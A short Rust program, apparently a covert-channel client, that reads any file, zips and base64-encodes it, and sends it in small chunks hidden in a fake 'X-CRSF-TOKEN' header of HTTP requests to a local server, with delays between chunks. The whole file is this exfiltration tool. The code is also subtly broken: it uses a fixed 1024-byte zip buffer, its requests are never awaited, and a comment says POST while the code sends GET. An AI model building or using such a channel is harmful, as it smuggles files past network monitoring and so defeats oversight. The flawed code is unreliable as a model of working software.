use std::{env, time};
use std::fs::File;
use std::path::PathBuf;
use std::io::Read;

use hyper::{Body, Client, Method, Request};

const REQUEST_URL: &str = "0.0.0.0:8000";

fn load_payload(payload: &PathBuf) -> std::io::Result<Vec<u8>> {
    let mut file = File::open(&payload)?;

    let mut buffer: Vec<u8> = Vec::with_capacity(file.metadata().unwrap().len() as usize);

    file.read_to_end(&mut buffer)?;
    Ok(buffer)
}

fn encode_payload(filename: &str, payload_buffer: &Vec<u8>) -> std::io::Result<String> {
    use std::io::Write;

    let buf: &mut [u8] = &mut [0u8; 1024];
    let w = std::io::Cursor::new(buf);
    let mut zip = zip::ZipWriter::new(w);

    let options = zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    zip.start_file(filename, options)?;
    zip.write(payload_buffer)?;

    // Optionally finish the zip. (this is also done on drop)
    let zipped = zip.finish().unwrap().into_inner().to_vec();
    Ok(base64::encode_config(&zipped, base64::URL_SAFE))
}

fn make_requests(payload: String, delay: u64,) {
    for chunk in payload.as_bytes().chunks(8) {
        let request = Request::builder()
            .method(Method::GET)
            .uri("http://localhost:8000/")
            .header("X-CRSF-TOKEN", chunk)
            .body(Body::from(r#"cheeky nando's"#))
            .expect("blah");

        let client = Client::new();

        // POST it...
        let _resp = client.request(request);

        std::thread::sleep(time::Duration::from_millis(delay));
    }
}

fn print_help() {
    println!("usage:
cc_client <payload file>
    Send payload via covert channel.");
}

fn main() {
    let args: Vec<String> = env::args().collect();

    match args.len() {
        2 => {
            let payload_path: &PathBuf = &PathBuf::from(&args[1]);
            let buffer: Vec<u8> = load_payload(payload_path).unwrap();

            let zipped: String = encode_payload(&args[1], &buffer).unwrap();

            println!("Zipped file: {:?}", zipped);
            make_requests(zipped, 100);
        }
        _ => {
            print_help();
        }
    }
}
